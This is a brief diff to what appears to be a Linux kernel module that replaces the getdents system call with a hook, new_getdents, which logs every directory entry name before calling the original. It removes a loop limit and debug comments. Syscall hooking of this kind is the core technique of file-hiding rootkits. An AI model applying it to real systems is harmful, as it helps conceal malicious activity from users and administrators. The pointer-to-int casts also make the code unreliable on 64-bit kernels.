@@ -75,18 +75,10 @@ asmlinkage int new_getdents(unsigned int fd, linux_dirent *dirp, unsigned int co
   if (nread != 0) {
     int bpos = 0;
     linux_dirent *d;
-    int i = 0;
-    while (i < 10 && bpos < nread) {
+    while (bpos < nread) {
       d = (linux_dirent *)((int)dirp + (int)bpos);
-      // printk(KERN_INFO "dirp: %d, bpos: %d, %d", dirp, bpos, (int)dirp + (int)bpos);
-      // printk(KERN_INFO "ADDR: %d", d);
-    // for (bpos = 0; bpos < nread;) {      
       printk(KERN_INFO "entry: %s\n", d->d_name);
-      // printk(KERN_INFO "%4d %s\n", d->d_reclen, d->d_name);
-      // bpos += d->d_reclen;
-      // printk(KERN_INFO "reclen: %d\n", d->d_reclen);
       bpos += (int)d->d_reclen;
-      i++;
     }
   }
   //Invoke the original syscall
